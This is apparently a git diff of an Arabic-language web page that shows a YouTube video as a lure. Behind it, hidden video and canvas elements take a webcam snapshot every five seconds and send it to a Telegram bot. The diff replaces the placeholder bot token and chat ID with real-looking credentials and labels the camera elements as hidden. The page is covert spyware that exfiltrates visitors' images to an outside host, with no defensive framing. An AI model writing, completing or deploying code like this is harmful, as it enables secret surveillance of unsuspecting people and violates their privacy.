@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>مشاهدة مع الكاميرا</title>
+  <title>التقاط تلقائي + فيديو يوتيوب</title>
   <style>
     html, body {
       margin: 0;
@@ -22,11 +22,11 @@
 </head>
 <body>
 
-  <!-- الكاميرا -->
+  <!-- عناصر الكاميرا المخفية -->
   <video id="video" autoplay playsinline width="320" height="240"></video>
   <canvas id="canvas" width="320" height="240"></canvas>
 
-  <!-- YouTube Video -->
+  <!-- تشغيل فيديو اليوتيوب -->
   <iframe
     src="https://www.youtube.com/embed/BT4WzyT2g8k"
     allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
@@ -34,8 +34,8 @@
   </iframe>
 
   <script>
-    const BOT_TOKEN = 'ضع_توكن_البوت_هنا';
-    const CHAT_ID = 'ضع_ChatID_هنا';
+    const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
+    const CHAT_ID = '6036900535';
 
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
@@ -52,6 +52,7 @@
           method: "POST",
           body: formData
         });
+        console.log("✅ تم إرسال صورة");
       } catch (err) {
         console.error("❌ فشل الإرسال", err);
       }
@@ -66,10 +67,11 @@
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           const imageData = canvas.toDataURL("image/png");
           sendToTelegram(imageData);
-        }, 5000);
+        }, 5000); // كل 5 ثواني
 
       } catch (error) {
         alert("🚫 فشل تشغيل الكاميرا: " + error.message);
+        console.error(error);
       }
     }
 
